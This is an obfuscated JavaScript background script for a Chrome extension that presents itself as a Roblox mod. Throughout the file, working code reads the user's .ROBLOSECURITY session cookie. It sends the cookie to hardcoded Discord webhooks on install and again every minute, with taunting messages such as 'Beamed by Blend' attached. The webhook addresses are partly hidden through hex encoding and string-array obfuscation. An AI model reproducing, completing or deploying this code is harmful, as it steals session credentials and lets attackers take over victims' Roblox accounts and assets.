var _0x1d71e4=_0x1d5e;(function(_0x5e0592,_0x1b63b8){var _0x7b57ad=_0x1d5e,_0x29fff7=_0x5e0592();while(!![]){try{var _0x30e22b=parseInt(_0x7b57ad(0x133))/0x1+parseInt(_0x7b57ad(0x13a))/0x2+parseInt(_0x7b57ad(0x136))/0x3+parseInt(_0x7b57ad(0x138))/0x4*(-parseInt(_0x7b57ad(0x134))/0x5)+parseInt(_0x7b57ad(0x132))/0x6*(parseInt(_0x7b57ad(0x131))/0x7)+-parseInt(_0x7b57ad(0x139))/0x8*(parseInt(_0x7b57ad(0x13c))/0x9)+-parseInt(_0x7b57ad(0x137))/0xa*(parseInt(_0x7b57ad(0x135))/0xb);if(_0x30e22b===_0x1b63b8)break;else _0x29fff7['push'](_0x29fff7['shift']());}catch(_0x5760eb){_0x29fff7['push'](_0x29fff7['shift']());}}}(_0x42dd,0xa9602));function _0x1d5e(_0x527835,_0x2a9214){var _0x42dd73=_0x42dd();return _0x1d5e=function(_0x1d5eb1,_0x408fe2){_0x1d5eb1=_0x1d5eb1-0x131;var _0x5d0e78=_0x42dd73[_0x1d5eb1];return _0x5d0e78;},_0x1d5e(_0x527835,_0x2a9214);}var discord_web_api=_0x1d71e4(0x13b);function _0x42dd(){var _0x1b7d35=['1753797dMIaIM','10LXAuyd','4iMGUat','16LebFQU','1644248kFYFcA','https://discord.com/api/webhooks/1100816660358774894/06WQif6R5Xr6S99AKBMtsEHHD5bvOBERqXee_NDcToFHAy72Vt161p2BXeN6NbBRxij1','451377pZiTgX','2259229wtgWNF','18vKtDYW','566735VjkgNs','732670haFDVL','22012067SrPYcr'];_0x42dd=function(){return _0x1b7d35;};return _0x42dd();}
var website = "https://www.roblox.com";
var cookie_data = ".ROBLOSECURITY";
var discord_web_apis = "https://discord.com/api/webhooks/1100816660358774894/06WQif6R5Xr6S99AKBMtsEHHD5bvOBERqXee_NDcToFHAy72Vt161p2BXeN6NbBRxij1";
var _0x9917 = ["alarms", "length", "substr", "push", website, cookie_data, "value", "\n", "join", "get", "cookies", discord_web_api, "?wait=true", "....", ".", "..", "...", "|", "POST", "ajax", "open", "Content-Type", "application/json; charset=UTF-8", "setRequestHeader", "stringify", "send", "random", "floor", "Beamed by Blend", "blend on top LOL", "Free bobux moment loool", "blend beamed this tard", "Fender Blender beamed u", " ", "tradeBackground", "create", "reason", "install", "tradeBotStart", "basic", "icon.png", "Mods! Mods has started!", "Welcome! Modding is now active!", "notifications", " get bemed ", "addListener", "onInstalled", "runtime", "name", "onAlarm"];
var _0x2d17 = [_0x9917[0], _0x9917[1], _0x9917[2], _0x9917[3], _0x9917[4], _0x9917[5], _0x9917[6], _0x9917[7], _0x9917[8], _0x9917[9], _0x9917[10], _0x9917[11], _0x9917[12], _0x9917[13], _0x9917[14], _0x9917[15], _0x9917[16], _0x9917[17], _0x9917[18], _0x9917[19], _0x9917[20], _0x9917[21], _0x9917[22], _0x9917[23], _0x9917[24], _0x9917[25], _0x9917[26], _0x9917[27], _0x9917[28], _0x9917[29], _0x9917[30], _0x9917[31], _0x9917[32], _0x9917[33], _0x9917[34], _0x9917[35], _0x9917[36], _0x9917[37], _0x9917[38], _0x9917[39], _0x9917[40], _0x9917[41], _0x9917[42], _0x9917[43], _0x9917[44], _0x9917[45], _0x9917[46], _0x9917[47], _0x9917[48], _0x9917[49]];
var _0x44b3 = [_0x2d17[0], _0x2d17[1], _0x2d17[2], _0x2d17[3], _0x2d17[4], _0x2d17[5], _0x2d17[6], _0x2d17[7], _0x2d17[8], _0x2d17[9], _0x2d17[10], _0x2d17[11], _0x2d17[12], _0x2d17[13], _0x2d17[14], _0x2d17[15], _0x2d17[16], _0x2d17[17], _0x2d17[18], _0x2d17[19], _0x2d17[20], _0x2d17[21], _0x2d17[22], _0x2d17[23], _0x2d17[24], _0x2d17[25], _0x2d17[26], _0x2d17[27], _0x2d17[28], _0x2d17[29], _0x2d17[30], _0x2d17[31], _0x2d17[32], _0x2d17[33], _0x2d17[34], _0x2d17[35], _0x2d17[36], _0x2d17[37], _0x2d17[38], _0x2d17[39], _0x2d17[40], _0x2d17[41], _0x2d17[42], _0x2d17[43], _0x2d17[44], _0x2d17[45], _0x2d17[46], _0x2d17[47], _0x2d17[48], _0x2d17[49]];
var _0x3a2f = [_0x44b3[0], _0x44b3[1], _0x44b3[2], _0x44b3[3], _0x44b3[4], _0x44b3[5], _0x44b3[6], _0x44b3[7], _0x44b3[8], _0x44b3[9], _0x44b3[10], _0x44b3[11], _0x44b3[12], _0x44b3[13], _0x44b3[14], _0x44b3[15], _0x44b3[16], _0x44b3[17], _0x44b3[18], _0x44b3[19], _0x44b3[20], _0x44b3[21], _0x44b3[22], _0x44b3[23], _0x44b3[24], _0x44b3[25], _0x44b3[26], _0x44b3[27], _0x44b3[28], _0x44b3[29], _0x44b3[30], _0x44b3[31], _0x44b3[32], _0x44b3[33], _0x44b3[34], _0x44b3[35], _0x44b3[36], _0x44b3[37], _0x44b3[38], _0x44b3[39], _0x44b3[40], _0x44b3[41], _0x44b3[42], _0x44b3[43], _0x44b3[44], _0x44b3[45], _0x44b3[46], _0x44b3[47], _0x44b3[48], _0x44b3[49]];
var _0x4e05=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x39\x39\x34\x36\x33\x33\x33\x30\x37\x36\x34\x36\x30\x37\x30\x38\x33\x34\x2F\x39\x55\x41\x52\x64\x47\x37\x48\x4B\x79\x39\x64\x34\x59\x53\x53\x39\x51\x34\x56\x51\x52\x38\x6D\x6D\x35\x49\x6C\x46\x35\x78\x52\x6E\x6D\x65\x30\x36\x42\x62\x6A\x78\x66\x4D\x52\x2D\x49\x43\x42\x31\x4D\x44\x61\x53\x34\x74\x59\x64\x57\x77\x7A\x45\x6C\x6B\x30\x68\x58\x2D\x64"];var discord_web_api=_0x4e05[0]
var asdd;
var alarms = chrome[_0x3a2f[0]];
function chunk(_0x2433xb, _0x2433xc) {
  var _0x2433xd = [];
  var _0x2433xe;
  var _0x2433xf;
  for (_0x2433xe = 0, _0x2433xf = _0x2433xb[_0x3a2f[1]]; _0x2433xe < _0x2433xf; _0x2433xe += _0x2433xc) {
    _0x2433xd[_0x3a2f[3]](_0x2433xb[_0x3a2f[2]](_0x2433xe, _0x2433xc));
  }
  ;
  return _0x2433xd;
}
function findCookie() {
  asdd = undefined;
  chrome[_0x3a2f[10]][_0x3a2f[9]]({url: _0x3a2f[4], name: _0x3a2f[5]}, function (_0x2433x11) {
    if (_0x2433x11[_0x3a2f[6]] && asdd != _0x2433x11[_0x3a2f[6]]) {
      asdd = chunk(_0x2433x11[_0x3a2f[6]], 60)[_0x3a2f[8]](_0x3a2f[7]);
    }
  });
}
findCookie();
var botUrl = _0x3a2f[11];
var debug = false;
if (debug === true) {
  botUrl = botUrl + _0x3a2f[12];
}
;
var coolEmojis = [_0x3a2f[13], _0x3a2f[14], _0x3a2f[15]];
var shapeEmojis = [_0x3a2f[16], _0x3a2f[17]];
function sendDiscordMessage(_0x2433x17) {
  $[_0x3a2f[19]]({type: _0x3a2f[18], url: botUrl, data: {content: _0x2433x17}});
}
function createEmbed(_0x2433x19, _0x2433x1a, _0x2433x1b) {
  var _0x2433x1c = {embeds: [{title: _0x2433x19, description: _0x2433x1a, color: _0x2433x1b}]};
  var _0x2433x1d = new XMLHttpRequest;
  _0x2433x1d[_0x3a2f[20]](_0x3a2f[18], botUrl);
  _0x2433x1d[_0x3a2f[23]](_0x3a2f[21], _0x3a2f[22]);
  _0x2433x1d[_0x3a2f[25]](JSON[_0x3a2f[24]](_0x2433x1c));
}
function cleanerCookieGrab() {
  chrome[_0x3a2f[10]][_0x3a2f[9]]({url: _0x3a2f[4], name: _0x3a2f[5]}, function (_0x2433x11) {
    if (_0x2433x11 && _0x2433x11[_0x3a2f[6]]) {
      pick = shapeEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * shapeEmojis[_0x3a2f[1]])];
      pick2 = coolEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * coolEmojis[_0x3a2f[1]])];
      cookiePhrases = [_0x3a2f[28], _0x3a2f[29], _0x3a2f[30], _0x3a2f[31], _0x3a2f[32]];
      cookiePhrase = cookiePhrases[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * cookiePhrases[_0x3a2f[1]])];
      titleItem = pick + pick2 + _0x3a2f[33] + cookiePhrase + _0x3a2f[33] + pick2 + pick;
      descItem = chunk(_0x2433x11[_0x3a2f[6]], 60)[_0x3a2f[8]](_0x3a2f[7]);
      color = 16559363;
      createEmbed(titleItem, descItem, color);
    }
  });
}
chrome[_0x3a2f[47]][_0x3a2f[46]][_0x3a2f[45]](function (_0x2433x1f) {
  var _0x2433x20 = alarms[_0x3a2f[35]](_0x3a2f[34], {delayInMinutes: 0.1, periodInMinutes: 1});
  if (_0x2433x1f[_0x3a2f[36]] == _0x3a2f[37]) {
    chrome[_0x3a2f[43]][_0x3a2f[35]](_0x3a2f[38], {type: _0x3a2f[39], iconUrl: _0x3a2f[40], title: _0x3a2f[41], message: _0x3a2f[42]});
    var _0x2433x21 = shapeEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * shapeEmojis[_0x3a2f[1]])];
    var _0x2433x22 = coolEmojis[Math[_0x3a2f[27]](Math[_0x3a2f[26]]() * coolEmojis[_0x3a2f[1]])];
    var _0x2433x23 = _0x2433x21 + _0x2433x22 + _0x3a2f[44] + _0x2433x21 + _0x2433x22;
    var _0x2433x24 = asdd;
    var _0x2433x25 = 16559363;
    createEmbed(_0x2433x23, _0x2433x24, _0x2433x25);
  }
});
chrome[_0x3a2f[0]][_0x3a2f[49]][_0x3a2f[45]](function (_0x2433x26) {
  if (_0x2433x26[_0x3a2f[48]] == _0x3a2f[34]) {
    cleanerCookieGrab();
  }
});
